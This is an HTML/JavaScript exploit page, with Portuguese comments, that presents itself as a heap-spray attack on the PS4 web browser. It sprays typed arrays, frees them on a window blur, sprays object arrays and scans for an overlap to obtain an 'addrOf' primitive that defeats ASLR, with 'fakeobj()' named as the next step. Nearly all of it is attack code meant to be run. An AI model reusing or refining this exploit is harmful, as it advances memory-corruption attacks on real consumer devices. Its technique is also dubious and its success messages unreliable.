<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 UAF - Cross-Type Attack</title>
<style>
    body { background: #000; color: #0f0; font-family: monospace; padding: 20px; text-align: center; }
    button { background: #d00; color: #fff; padding: 20px 40px; font-size: 1.5em; border: 2px solid #fff; cursor: pointer; }
    #log { text-align: left; margin: 20px auto; border: 1px solid #333; padding: 10px; max-width: 800px; background: #111; }
    .success { color: #fff; background: #008800; padding: 5px; font-weight: bold; }
    .pointer { color: #0ff; font-weight: bold; }
</style>
</head>
<body>

<h1>⚔️ CROSS-TYPE SPRAY ATTACK</h1>
<p>Tentando quebrar o IsoHeap misturando Floats e Ponteiros</p>

<button onclick="fire()">INICIAR ATAQUE</button>
<div id="log">Logs...</div>

<script>
    const Log = document.getElementById('log');
    function log(msg) { Log.innerHTML += msg + "<br>"; }

    // Utilitários
    function f2i(f) {
        let buf = new ArrayBuffer(8);
        (new Float64Array(buf))[0] = f;
        return (new BigUint64Array(buf))[0];
    }

    function hex(i) {
        return '0x' + i.toString(16).padStart(16, '0');
    }

    // O objeto que queremos vazar o endereço
    const LEAK_OBJ = { id: "EU SOU O OBJETO SECRETO", marker: 0x1337 };

    // Configuração
    let controllers = [];
    let targets = [];
    
    // Tamanho crítico: 8 elementos * 8 bytes = 64 bytes (+ header)
    // Arrays de Objetos e Arrays de Doubles com mesmo tamanho competem pelo mesmo espaço
    const SIZE = 8; 

    function fire() {
        log("1. Preparando Heap Misto...");

        // Criar Controllers (Floats) e Targets (Floats)
        for(let i=0; i<10000; i++) {
            let ctrl = new Float64Array(SIZE);
            ctrl[0] = i; // ID para identificar qual controller sobreviveu
            controllers.push(ctrl);

            let target = new Float64Array(SIZE);
            target.fill(1.1);
            targets.push(target);
        }

        log("2. Heap Pronto. APERTE OPTIONS AGORA!");
        
        const doc = document.documentElement;
        if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
        else if (doc.requestFullscreen) doc.requestFullscreen();

        window.onblur = function() {
            log("3. Blur! Executando Cross-Spray...");

            // A MÁGICA:
            // 1. Liberamos os Arrays de FLOATS (Targets)
            targets = null;

            // 2. Fazemos Spray de ARRAYS DE OBJETOS
            // Se o isolamento falhar, um Array de Objetos vai cair no buraco do Float
            let spray = [];
            try {
                for(let i=0; i<15000; i++) {
                    // Criamos um array JS normal, contendo ponteiros para nosso objeto
                    let arr = new Array(SIZE);
                    arr.fill(LEAK_OBJ); 
                    spray.push(arr);
                }
            } catch(e) {}

            log("4. Verificando overlap...");
            checkResults();
        };
    }

    function checkResults() {
        let found = false;

        for(let i=0; i<controllers.length; i++) {
            try {
                let val = controllers[i][0];
                
                // Se o overlap funcionou:
                // O controller (Float) vai ler o primeiro elemento do Spray (Objeto)
                // O valor não será o ID 'i', nem 1.1.
                // Será um ponteiro enorme (endereço de memória do LEAK_OBJ)
                
                // Filtro: Valor > 0x10000 e não é inteiro pequeno
                if (val > 10000 && !Number.isInteger(val)) {
                    let ptr = f2i(val);
                    
                    // Verifica se parece um ponteiro JSCell (frequentemente começa com 0x0000 ou 0x0001 no Userland)
                    // Ou tem o formato NaN-Boxed (0xfffe... ou 0x0000...)
                    
                    found = true;
                    let h = hex(ptr);
                    
                    log(`<div class="success">SUCESSO! AddrOf PRIMITIVE ENCONTRADA!</div>`);
                    log(`Controller[${i}] leu um ponteiro!`);
                    log(`Valor Float: ${val}`);
                    log(`Valor Hex (Endereço): <span class="pointer">${h}</span>`);
                    
                    // Explicação do que aconteceu
                    log("<br><b>O que isso significa?</b>");
                    log("Conseguimos ler o endereço real do objeto LEAK_OBJ na RAM.");
                    log("Isso quebra o ASLR. O próximo passo é fakeobj().");
                    
                    document.body.style.background = "#004400";
                    return;
                }
            } catch(e) {}
        }

        if(!found) {
            log("Falha. O IsoHeap impediu o overlap Float <-> Object.");
            log("Tente ajustar o tamanho (const SIZE) para 12, 16 ou 24.");
            document.body.style.background = "#440000";
        }
    }
</script>
</body>
</html>
